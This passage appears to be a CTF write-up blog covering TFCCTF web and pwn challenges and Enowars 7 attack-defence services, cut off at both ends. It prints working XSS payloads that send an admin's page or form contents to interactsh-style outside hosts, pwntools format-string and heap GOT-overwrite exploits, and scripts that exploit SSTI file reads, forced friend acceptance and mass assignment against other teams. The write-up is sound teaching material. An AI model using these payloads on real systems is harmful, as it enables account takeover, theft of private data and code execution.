located. query(con, f&#39;&#39;&#39; INSERT INTO posts ( user_id, title, content, hidden ) VALUES ( 1, &#39;Here is a ducky flag!&#39;, &#39;{os.environ.get(&quot;FLAG&quot;)}&#39;, 0 ); &#39;&#39;&#39;)The flag is in the db as a post by the admin but the hidden column is set to 0 so it is publically viewable.Checking the routes we find where we can view it:@web.route(&#39;/posts/view/&amp;lt;user&amp;gt;&#39;, methods=[&#39;GET&#39;])@auth_requireddef posts_view(username, user): try: posts = db_get_user_posts(user, username == user) except: raise Exception(username) return render_template(&#39;posts.html&#39;, posts=posts)We see the flag by visiting http://challs.tfcctf.com:30395/posts/view/adminFlag:TFCCTF{Adm1n_l0St_h1s_m1nd!} Baby Ducky Notes: RevengeThe challenge has patched the previous issue but there is more to find.This time the flag is a hidden post so we can’t see it just by visiting the URL because hidden posts can only be seen by the user who uploaded them.We need to XSS the admin and get them to visit that page and send us the content.In the flask template for the posts page we see the following:&amp;lt;p&amp;gt; {{post.get(&#39;content&#39;) | safe}} &amp;lt;/p&amp;gt;The usage of “safe” here means that flask will not sanitize the post content which allows us to XSSSo we make a new post with this as the post content:&amp;lt;script&amp;gt;var http=new XMLHttpRequest();http.open(&#39;GET&#39;,&#39;http://challs.tfcctf.com:31743/posts/view/admin&#39;, true);http.onreadystatechange=function(){ var out = new XMLHttpRequest(); out.open(&#39;POST&#39;,&#39;https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live&#39;) out.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;); out.send(&#39;data=&#39;+btoa(http.responseText));}http.send();&amp;lt;/script&amp;gt;We get this response on our interactsh output:POST / HTTP/2.0Host: cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.liveAccept: */*Accept-Encoding: gzip, deflate, brContent-Length: 5Content-Type: application/x-www-form-urlencodedOrigin: http://localhost:1337Referer: http://localhost:1337/Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;99&quot;, &quot;HeadlessChrome&quot;;v=&quot;115&quot;, &quot;Chromium&quot;;v=&quot;115&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Linux&quot;Sec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: cross-siteUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/115.0.5790.110 Safari/537.36data=No data? Strange. The referer and origin reveal that the URL for the bot is not the same as the one we see so we must change our payload to account for that as the cookies are tied to that URL.Final payload:&amp;lt;script&amp;gt;var http=new XMLHttpRequest();http.open(&#39;GET&#39;,&#39;http://localhost:1337/posts/view/admin&#39;, true);http.onreadystatechange=function(){ var out = new XMLHttpRequest(); out.open(&#39;POST&#39;,&#39;https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live&#39;) out.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;); out.send(&#39;data=&#39;+btoa(http.responseText));}http.send();&amp;lt;/script&amp;gt;We get back:data=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCI+CiAgICA8dGl0bGU+QmFieSBEdWNreSBOb3RlczogUmV2ZW5nZSE8L3RpdGxlPgogICAgPHNjcmlwdCBzcmM9Ii9zdGF0aWMvanMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSIvc3RhdGljL2pzL3JlcG9ydC5qcyI+PC9zY3JpcHQ+CiAgICA8bGluayByZWw9InByZWNvbm5lY3QiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20iPgogICAgPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tIiBjcm9zc29yaWdpbj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3N0YXRpYy9jc3Mvc3R5bGVzLmNzcyIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgICAKICAgIDxuYXYgY2xhc3M9Im5hdmJhciI+CiAgICAgICAgPGRpdiBpZD0idHJhcGV6b2lkIj4KICAgICAgICAgICAgPGEgaHJlZj0iL2xvZ2luIiBjbGFzcz0iZXhwYW5kSG9tZSI+TG9naW48L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9yZWdpc3RlciIgY2xhc3M9ImV4cGFuZEhvbWUiPlJlZ2lzdGVyPC9hPgogICAgICAgICAgICA8YSBocmVmPSIvcG9zdHMvdmlldy9hZG1pbiIgY2xhc3M9ImV4cGFuZEhvbWUiPlZpZXc8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9wb3N0cy9jcmVhdGUiIGNsYXNzPSJleHBhbmRIb21lIj5DcmVhdGU8L2E+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJwb3N0c19saXN0Ij4KICAgIDx1bCBjbGFzcz0icG9zdHNfdWwiPgogICAgICAgIAogICAgICAgIDxsaT4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmxvZ19wb3N0Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lcl9jb3B5Ij4KICAgICAgICAgICAgICAgICAgPGgxPiBIZXJlIGlzIGEgZHVja3kgZmxhZyEgPC9oMT4KICAgICAgICAgICAgICAgICAgPGgzPiBhZG1pbiA8L2gzPgogICAgICAgICAgICAgICAgICA8cD4gVEZDQ1RGe0V2M3J5X2R1Q2tfa24wdzVfeFNzIX0gPC9wPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvbGk+CiAgICAgICAgIAogICAgPC91bD4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9InJlcG9ydCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSIgaWQ9ImFsZXJ0LW1zZyIgaGlkZGVuID48L2Rpdj4KICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgaWQ9InJlcG9ydC1idG4iPlJlcG9ydCB0byBhZG1pbjwvYnV0dG9uPgogICAgPC9kaXY+CiAgICAKICAgIDxmb290ZXI+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyLWNvbnRlbnQiPgogICAgICAgICAgICA8aDM+RGlzY2xhaW1lcjwvaDM+CiAgICAgICAgICAgIDxwPlRoaXMgY2hhbGxlbmdlIGlzIG1hZGUgdG8gYmUgaGFja2VkLiBBbnkgaW5kaWNhdGlvbiBvZiBwcm9wZXIgdXNhZ2Ugb3IgdW50YXBwZWQgYWN0aXZpdHkgd2lsbCByZXN1bHQgaW4gbGVnYWwgc2FuY3Rpb25zLiBIYXBweSBoYWNraW5nITwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXItYm90dG9tIj4KICAgICAgICAgICAgPHA+Y29weXJpZ2h0ICZjb3B5OyA8YSBocmVmPSIjIj5TYWdpIC8gVGhlIEZldyBDaG9zZW4gQ1RGIDIwMjMgPC9hPiAgPC9wPgogICAgICAgICAgICA8ZGl2IGlkPSJwb3QiPgogICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9zdGF0aWMvaW1hZ2VzL2R1Y2suZ2lmIiB3aWR0aD0xMDBweCBoZWlnaHQ9MTAwcHg+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CgogICAgPC9mb290ZXI+CiAgICAKPC9ib2R5PgoKPC9odG1sPg==Base64 decoding that and we get the flag: &amp;lt;div class=&quot;blog_post&quot;&amp;gt; &amp;lt;div class=&quot;container_copy&quot;&amp;gt; &amp;lt;h1&amp;gt; Here is a ducky flag! &amp;lt;/h1&amp;gt; &amp;lt;h3&amp;gt; admin &amp;lt;/h3&amp;gt; &amp;lt;p&amp;gt; TFCCTF{Ev3ry_duCk_kn0w5_xSs!} &amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt;Cookie StoreThis is another XSS challenge. This time the bot types the flag into a form as we can see in the source code we’re given: client.get(f&quot;http://localhost:1337/form_builder?fields={fields}&quot;) time.sleep(2) client.find_element(By.ID, &quot;title&quot;).send_keys(FLAG) client.execute_script(&quot;&quot;&quot;document.querySelector(&#39;input[type=&quot;submit&quot;]&#39;).click();&quot;&quot;&quot;) time.sleep(2)Initially it seemed like this was going to be an XSS challenge. We can see we can get HTML injection as the javascript dynamically modifies the page in templates/form_builder.html: let form_html = &#39;&#39;; let fields_list = []; if (fields) { fields_list = fields.split(&#39;,&#39;); fields_list.forEach(element =&amp;gt; { form_html += `&amp;lt;div class=&quot;mb-4&quot;&amp;gt; &amp;lt;label for=&quot;${element}&quot; class=&quot;block text-gray-700 font-bold mb-2&quot;&amp;gt;${element}&amp;lt;/label&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;${element}&quot; id=&quot;${element}&quot; class=&quot;shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline&quot;&amp;gt; &amp;lt;/div&amp;gt;`; }); } // This will sanitize the input document.querySelector(&#39;#form_builder&#39;).setHTML(form_html);This setHTML function didn’t work in my browser but it’s supposed to sanitize HTML to disallow most forms of XSS so script tags dont work and event attributes like onclick etc also don’t work.We were able to get the flag with this payload:&amp;lt;input type=&quot;submit&quot; formaction=&quot;http://cj2o7ibb7pn8qd9o99dg8w48u735kpf5k.oast.fun/lol&quot; /&amp;gt;The bot will click this button as its earlier on the page than the other. According to the docs from Mozilla the formaction attribute takes precedence over the action attribute on the form element so the inputs in the form will go to our page instead of the intended one.In the interactsh window we got the flag:TFCCTF{144ab0e4c358b00b1258f2aea2250b21}Another approach we looked into was CSS injection where we extract the flag character by character but that didn’t work.Another technique that did work was redirecting to a page we control and then getting the contents of that form.Payload: &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://ourserver&quot;&amp;gt;On our server we have the page:&amp;lt;form method=&quot;post&quot; action=&quot;http://ourserver/log&quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;title&quot; id=&quot;title&quot;&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&amp;gt;&amp;lt;/form&amp;gt;By saving whats submitted to log we get the flag.McTreeThis is a very basic web app. There is a register page and a login page. When we login we get a messageGet out of here, username!From testing different things we noticed that some characters were filtered from the username like ‘{‘By registering an account with the username ‘admin{‘ the password for the admin account gets changed and we can login.The flag is then shown on the page:TFCCTF{I_l1k3_dr4g0n_tr33s__Yuh!_1ts_my_f4v0r1t3_tr33_f0r_sur3!}PwnShello WorldFor this challenge we are just given a 64 bit elf file.It’s a fairly small binary with only 3 functions. Main, Vuln and win. The win function just runs “bin/sh” so this will be our target.The vuln function has the following code: fgets((char *)&amp;amp;local_108,0x100,stdin); printf(&quot;Hello, &quot;); printf((char *)&amp;amp;local_108); putchar(10); return;So right away we can see a printf / format strings vulnerability. We can confirm this by running the program and sending %p.❯ ./shello-world%pHello, 0x7fff65541f00We don’t have any overflow and checking the securities with checksec we can see that “RELRO” is only set to Partial. This means we can overwrite parts of the GOT. Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)So our attack will be a basic format strings GOT overwrite. pwntools makes this very easy. I choose exit as my GOT entry to overwrite.Running the script the remote server we can cat the flag:TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}Full script:#!/usr/bin/env python3from pwn import *exe = &#39;./shello-world&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())def send_payload(payload): io.sendline(payload) return io.recvline()#### Exploit starts here ####io = start()payload = fmtstr_payload(6, { elf.got.exit : elf.sym.win }, write_size=&#39;short&#39;)io.sendline(payload)io.interactive()RandomThis challenge is a random number “guesser” style challenge. This is something I have seen a fair bit lately and even made a challenge around the idea myself in the past. So right away I knew I could use the CDLL library from python. setup(); tVar2 = time((time_t *)0x0); srand((uint)tVar2); for (local_14 = 0; local_14 &amp;lt; 10; local_14 = local_14 + 1) { iVar1 = rand(); *(int *)(v + (long)local_14 * 4) = iVar1; } puts(&quot;Guess my numbers!&quot;); for (local_10 = 0; local_10 &amp;lt; 10; local_10 = local_10 + 1) { __isoc99_scanf(&amp;amp;DAT_0010201e,input + (long)local_10 * 4); } local_c = 0; while( true ) { if (9 &amp;lt; local_c) { win(); return 0; } if (*(int *)(v + (long)local_c * 4) != *(int *)(input + (long)local_c * 4)) break; local_c = local_c + 1; } puts(&quot;You didn\\&#39;t make it :(&quot;); /* WARNING: Subroutine does not return */ exit(0);}This output from ghidra gives us enough detail to solve this.The program prints guess my numbers! and we have to try guess the correct number 10 times in a row. if we do that the program runs the win() function which just runs /bin/sh for us.From the 2nd and 3rd line you can see the seed for rand is using the current time. This time is just unix time we dont need to worry about time zones or anything like that.solve script:#!/usr/bin/env python3from pwn import *from ctypes import CDLLimport timeexe = &#39;./random&#39;elf = ELF(exe)context.binary = elfcontext.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())#### Exploit starts here ####io = start()libc = CDLL(&#39;libc.so.6&#39;)current_time = libc.time(None)current_time = current_time + 0 libc.srand(current_time)io.recvuntil(b&#39;numbers!&#39;)for i in range(10): guess = libc.rand() io.sendline(str(guess).encode())io.interactive()flag:TFCCTF{W0W!_Y0U_GU3SS3D_TH3M_4LL!@!}sometimes on remote you might need to + a few seconds here: current_time = current_time + 0 NotesThis is a standard heap note style challenge. we are given the source code for this which was nice :)#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#define CONTENT_MAX (long long)256#define NOTES_MAX 10typedef struct _note_t { char* content;} note_t;void win() { system(&quot;/bin/sh&quot;);}void menu() { printf( &quot;1. Add note\\n&quot; &quot;2. Edit note\\n&quot; &quot;3. View notes\\n&quot; &quot;0. Exit\\n&quot; );}int get_index() { printf(&quot;index&amp;gt; \\n&quot;); int index; scanf(&quot;%d&quot;, &amp;amp;index); getchar(); if (index &amp;lt; 0 || index &amp;gt; NOTES_MAX) { return -1; } return index;}note_t* add() { note_t* note = malloc(sizeof(note_t)); note-&amp;gt;content = malloc(sizeof(CONTENT_MAX)); printf(&quot;content&amp;gt; \\n&quot;); fgets(note-&amp;gt;content, sizeof(CONTENT_MAX), stdin); return note;}void edit(note_t* note) { printf(&quot;content&amp;gt; \\n&quot;); fgets(note-&amp;gt;content, CONTENT_MAX, stdin);}void view(note_t* notes[]) { for (int i = 0; i &amp;lt; NOTES_MAX; i += 1) { printf(&quot;%d. &quot;, i); if (notes[i] == NULL) { printf(&quot;&amp;lt;empty&amp;gt;\\n&quot;); } else { printf(&quot;%s\\n&quot;, notes[i]-&amp;gt;content); } }}int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); note_t* notes[10] = { 0 }; while (1) { menu(); int input; scanf(&quot;%d&quot;, &amp;amp;input); switch (input) { case 1: { int index = get_index(); if (index == -1) { break; } notes[index] = add(); break; } case 2: { int index = get_index(); if (index == -1) { break; } if (notes[index] == NULL) { break; } edit(notes[index]); break; } case 3: view(notes); break; case 0: exit(0); break; default: break; } }}We have a win function which will be our target. This challenge has a heap overflow. the add function and the edit function both have different values for the size of the data we enter. as a result we can overflow from one chunk into the next.My idea for this exploit was GOT overwrite as it seemed the best option. If we can overwrite exit with win, the next time we call exit (sending 0 as input) win will be called and we should get a shell.As someone new to heap this challenge took a fair bit of debugging and messing around with GDB. eventually I got a working exploit.We first need to create new notes. the content of these does not matter.Than we edit the first note. and overflow into the 2nd not with our pointer to got exit once we overflow into chunk2 we can edit chunk 2 with the address of win and this will overwrite got exit with winsolve script:#!/usr/bin/env python3from pwn import *exe = &#39;./notes&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;tbreak maincontinue&#39;&#39;&#39;.format(**locals())def add_note(index, content): io.sendline(b&#39;1&#39;) io.sendline(str(index)) io.sendline(content)def edit_note(index, content): io.sendline(b&#39;2&#39;) io.sendline(str(index)) io.sendline(content)#### Exploit starts here ####io = start()win = elf.symbols.winexit_got = elf.got.exitadd_note(1,b&#39;A&#39;)add_note(2,b&#39;B&#39;)edit_note(1,b&#39;A&#39;*32+p64(exit_got))edit_note(2,p64(win))io.sendline(b&#39;0&#39;) # exitio.interactive()flag;TFCCTF{103a360f285151bfda3fb4009852c15084fd9bf997470c43c20eef413ed98898}RevPassThis is a crackme style program. While I could have actually tried to reverse the binary that goes against everything I believe in. So I looked at the main function and saw the two strings I would need.“Wrong password” and “Correct password”The address of Wrong was @ 0x00101984The address of Correct was @ 0x001019b3I used angr to solve this challenge. after about 5-10 seconds I get the flag:import angr# start at 0x400000 because cus PIE is enabledwin_adress = 0x19b3 + 0x400000fail_adress = 0x1984 + 0x400000p = angr.Project(&#39;./pass&#39;)simgr = p.factory.simulation_manager(p.factory.full_init_state())simgr.explore(find=win_adress, avoid=fail_adress)print(simgr.found[0].posix.dumps(0))flag:TFCCTF{f0und_th3_p44sv0rd}" }, { "title": "Enowars 7", "url": "/posts/Enowars7/", "categories": "Attack-Defence", "tags": "ctf, attack-defence, web, ssti", "date": "2023-07-22 00:00:00 +0000", "snippet": "Oldschool - Twig SSTIOne of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49We exploiting this in the “About me” section of the user profileAs a result of this snipped of code. we can pass SSTI payloads into service.From testing it seemed RCE was not going to work. We still had file read which is enough for us to exploit this. The following payload is used for file read:{{ source(&quot;grades/file_to_read&quot;) }}This would result in an error on the page so it was wrapped in a comment:Final payload: &amp;lt;!-- {{ source(&quot;file_we_want_to_read&quot;) }} --!&amp;gt; So we can read any file we want. but we need to read flag files! Looking at the attack.json endpoint we can see what flagstores are useful for Oldschool.A file is being upload and named randomints_md5hash this md5 hash. From looking at our own box these files are being saved in /services/grades/so we need to read grades/FLAG_IDI tested this on the NOP team with a simple payload of :&amp;lt;!-- {{ source(&quot;grades/138219_1143facd439275abb0caed4979e4f8bf&quot;) }} --!&amp;gt; and sure enough. the flag was in the source of the page. Now it was just a matter of writing an exploit script that will go to each team and grab that flag.ExploitingWe need to automate out exploit in order to exploit all the teams. To do this, we need a few “stages” to our exploit. the basic plan is: Create an account Using that account update About me with out SSTI payload Retrieve and submit the flagWe used a random string for the username and password for each account and would make a new account for each attack. The following code will make an account for us:session = requests.Session()username = rand_string(10)password = rand_string(10)session.post(f&quot;http://{ip}:9080/index.php?action=register&quot;, data={&quot;username&quot;:username,&quot;password&quot;:password})We than update our profile “about me” with out payload and grab the results of the page:payload = {&#39;about_me&#39;: &#39;&amp;lt;!--{{ source(&quot;grades/&#39;+FLAGID+&#39;&quot;) }}--&amp;gt;&#39;}session.post(f&quot;http://{ip}:9080/index.php?action=profile&quot;, data=payload)profile_page = session.get(f&quot;http://{ip}:9080/index.php?action=profile&quot;).textFLAGID and IP are taken from the attack.json endpoint.We used this bit of code to only return the flag string from out exploit script:flag_regex = re.compile(&#39;ENO[A-Za-z0-9+/=]{48}&#39;)flags = flag_regex.findall(profile_page)print(flags)Our exploit manager handles the submitting of the flag. so printing it out like that is enough for this script.Full script:#!/usr/bin/python3import requestsimport randomimport stringimport reimport osimport jsonletters = string.ascii_lowercasedef rand_string(num): return &#39;&#39;.join(random.choice(letters) for i in range(num))ip = os.getenv(&#39;TARGET_IP&#39;)extra = json.loads(os.getenv(&#39;TARGET_EXTRA&#39;))for x in extra.keys(): FLAGID = extra[x][&#39;1&#39;][0].split(&#39; &#39;)[-1] session = requests.Session() username = rand_string(10) password = rand_string(10) payload = {&#39;about_me&#39;: &#39;&amp;lt;!--{{ source(&quot;grades/&#39;+FLAGID+&#39;&quot;) }}--&amp;gt;&#39;} session.post(f&quot;http://{ip}:9080/index.php?action=register&quot;, data={&quot;username&quot;:username,&quot;password&quot;:password}) session.post(f&quot;http://{ip}:9080/index.php?action=profile&quot;, data=payload) profile_page = session.get(f&quot;http://{ip}:9080/index.php?action=profile&quot;).text flag_regex = re.compile(&#39;ENO[A-Za-z0-9+/=]{48}&#39;) flags = set(flag_regex.findall(profile_page)) for flag in flags: print(flag) asocialnetwork - Broken Access ControlThis was wonderfully made social media app. We found from tulip that the Chatroom will contain a flag. The chatroom that has a flag was the room that a user from the attack.json file was a part of. The only issue is in order to know that room this user is a part of, you must be their friend, and making friends is hard so lets force them to be our friend.When you send a friend request the following request is made:partner=THEIRNAME&amp;amp;userName=YOURNAME&amp;amp;status=sendif (req.body.status === &#39;accept&#39;) { if (!friend) { res.status(400).send(&#39;Acceptance Request not found&#39;) return } else { friend.status = &#39;accepted&#39; await friend.save() }}however, you can force them to accept your friend request by changing “send” to “accept”There is no check to ensure the user accepting the request is not the user that sent the request.So now that we are suddenly very popular. we can view our new friend profile and see what rooms they are part of. (I don’t have any screenshots of this from the live CTF). Viewing their profile gave us a room ID. this room ID was not valid to just join the chatroom. From review of the source code we needed to get the sha256 of that ID. This would let us join the chatroom and get the flag.ExploitingFor this exploit we need to: Make a new account Send a friend request to our new friend Force them to accept it. get the sha256sum of the room ID Visit the room and get the flagFirst bit is done with this:session = requests.Session()username = rand_string(10)password = rand_string(10)session.post(f&quot;http://{ip}:3000/register&quot;, data={&quot;username&quot;:username,&quot;password&quot;:password,&quot;confirmPassword&quot;:password})We can than send and accept the friend request with this:session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;send&quot;})session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;accept&quot;})The final part is to go to our new friends page. get the ID, hash it and view the chatroom:friend_page = session.get(f&quot;http://{ip}:3000/profile/{FLAGID}&quot;).textpattern = r&#39;&amp;lt;div class=&quot;room&quot;&amp;gt;\\s*&amp;lt;h3&amp;gt;(.*?)&amp;lt;/h3&amp;gt;&#39;test = re.search(pattern,friend_page)roomid_tmp = test.group(1).encode(&#39;utf-8&#39;)roomid = hashlib.sha256(roomid_tmp).hexdigest()chatroom = session.get(f&quot;http://{ip}:3000/chatroom/{roomid}&quot;).textFull script:#!/usr/bin/python3import requestsimport randomimport stringimport reimport osimport jsonimport hashlibletters = string.ascii_lowercasedef rand_string(num): return &#39;&#39;.join(random.choice(letters) for i in range(num))ip = os.getenv(&#39;TARGET_IP&#39;)extra = json.loads(os.getenv(&#39;TARGET_EXTRA&#39;))for x in extra.keys(): FLAGID =json.loads(extra[x][&#39;1&#39;][0])[&#39;username&#39;] #print(FLAGID) try: session = requests.Session() username = rand_string(10) password = rand_string(10) session.post(f&quot;http://{ip}:3000/register&quot;, data={&quot;username&quot;:username,&quot;password&quot;:password,&quot;confirmPassword&quot;:password}) session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;send&quot;}) session.post(f&quot;http://{ip}:3000/friends/requests/&quot;, data={&quot;partner&quot;:FLAGID,&quot;userName&quot;:username,&quot;status&quot;:&quot;accept&quot;}) friend_page = session.get(f&quot;http://{ip}:3000/profile/{FLAGID}&quot;).text pattern = r&#39;&amp;lt;div class=&quot;room&quot;&amp;gt;\\s*&amp;lt;h3&amp;gt;(.*?)&amp;lt;/h3&amp;gt;&#39; test = re.search(pattern,friend_page) roomid_tmp = test.group(1).encode(&#39;utf-8&#39;) roomid = hashlib.sha256(roomid_tmp).hexdigest() chatroom = session.get(f&quot;http://{ip}:3000/chatroom/{roomid}&quot;).text flag_regex = re.compile(&#39;ENO[A-Za-z0-9+/=]{48}&#39;) flags = flag_regex.findall(chatroom) for flag in set(flags): print(flag) except Exception as e: print(e)OldSchool - Mass AssignmentFor the Oldschool service we were able to update our user profile.Here is the function:function updateProfile($userId, $profileData){ $dbh = DB::getInstance(); $sql = &#39;UPDATE users SET &#39;; $params = []; $first = true; foreach ($profileData as $key =&amp;gt; $value) { if (!$first) { $sql .= &#39;, &#39;; } else { $first = false; } $sql .= $key . &#39; = :&#39; . $key; $params[&#39;:&#39; . $key] = $value; } $sql .= &#39; WHERE id = :userId&#39;; $params[&#39;:userId&#39;] = $userId; if (isset($params[&#39;:password&#39;]) &amp;amp;&amp;amp; $params[&#39;:password&#39;] != &#39;&#39;) { $params[&#39;:password&#39;] = password_hash($params[&#39;:password&#39;], PASSWORD_DEFAULT); } $stmt = $dbh-&amp;gt;prepare($sql); $stmt-&amp;gt;execute($params);}When the function is called it gets passed the full $_POST array:updateProfile($_SESSION[&#39;user&#39;][&#39;id&#39;], $_POST);There is of course an SQLi in this function but it was easier to exploit the mass assignment for the same flag.The mass assignment is also harder to patch.Mass assignment vulnerabilities occurs when an application allows us to specify what fields to update without any constraints - in this case admin_of is something we shouldnt be allowed to change.To exploit this we register an account, submit a post request with admin_of=123 where 123 is given to use in the attack json.Then we can view the profile of the user given in the attack json which has a flag for us to take.#!/usr/bin/python3import requestsimport randomimport stringimport reimport jsonfrom sys import argvimport osletters = string.ascii_lowercase#script,ip = argvip = os.getenv(&#39;TARGET_IP&#39;)extra = json.loads(os.getenv(&#39;TARGET_EXTRA&#39;))session = requests.Session()headers = {&#39;User-Agent&#39;:&#39;python-httpx/0.23.3&#39;} # user agent of the flag checker (afaik)flag_regex = re.compile(r&#39;ENO[A-Za-z0-9+/=]{48}&#39;)def rand_string(num): return &#39;&#39;.join(random.choice(letters) for i in range(num))username = rand_string(10)password = rand_string(10)session.post(f&quot;http://{ip}:9080/index.php?action=register&quot;,data={&quot;username&quot;:username,&quot;password&quot;:password},headers=headers)for x in extra.keys(): extra_txt = extra[x][&#39;0&#39;][0] course_id = extra_txt.split(&#39; &#39;)[-1] user_id = extra_txt.split(&#39; &#39;)[3] session.post(f&quot;http://{ip}:9080/index.php?action=profile&quot;, data={&quot;aDmIn_oF&quot;:course_id}) # mixed case to bypass weak filters page = session.get(f&quot;http://{ip}:9080/index.php?action=profile&amp;amp;id={user_id}&quot;).text flags = set(flag_regex.findall(page)) for flag in flags: print(flag)BollwerkVuln 1 - Bruteforcable TokensThe first vuln we found was with how the app handles support tickets/complaints. When creating a complaint, its stored through a b64 token of your username, ‘_’ for padding and the first 8 chars of uniqid()#app/Controller/SupportController.php:38 private function generateToken(string $username): string { return base64_encode(sprintf(&quot;%-&#39;_21s%.8s&quot;, $username, uniqid())); }Uniqid reutrns a “unique” identifier based on the current time in microseconds. But since its only using the first 8 bytes. It’s not that unique, with only the last 1 or 2 bytes being different. So you can brute force the ID with relative ease.php &amp;gt; echo sprintf(&quot;%.8s&quot;, uniqid());# 64c1709ephp &amp;gt; echo sprintf(&quot;%.8s&quot;, uniqid());# 64c1709fphp &amp;gt; echo sprintf(&quot;%.8s&quot;, uniqid());# 64c170a0Looking at /support-disclaimer of the web app will reveal all current complains. This includes the username and the time that the complaint was made. Using the two of these you can quickly generate the valid tokens and get the flag.PatchOur patch for this was to just replace uniqid with random_bytes() so the bytes are actually unique.#app/Controller/SupportController.php:38private function generateToken(string $username): string { return base64_encode(sprintf(&quot;%-&#39;_21s%.8s&quot;, $username, bin2hex(random_bytes(10)) )); }We also stripped the submission date from the /support-disclaimer page to make getting the exact submission time harder to get.Vuln 2 - LFIThe second vuln found was intended as LFI by calling on the $viewPath variable, but we were able to get RCE.$viewPath is inside the function render which is used to render a view file and return its contents as a response object. When the $viewPath variable is used in your request, the contents of the file being viewed and can be rendered.#app/Http/View.php:18public static function render(string $view, array $parameters = []): Response { ob_start(); $viewPath = &quot;View/$view.php&quot;; extract([...static::createGlobals(), ...$parameters]); require(resolvePath($viewPath)); return Response::create((string)ob_get_clean()); }The resolvePath function is used to get the path of the file to be rendered. However, its limited to these directoriesconst ALLOW_LIST = [&#39;files&#39;,&#39;public&#39;,&#39;View&#39;,];With all of this, we can now view any files that are in the directories listed in ALLOW_LIST. We know that when a user creates a recipe, the file is stored in a directory that is the md5 hash of the users username.public function createRecipe(array $data): Recipe{$directory = resolvePath(&#39;files/&#39; . 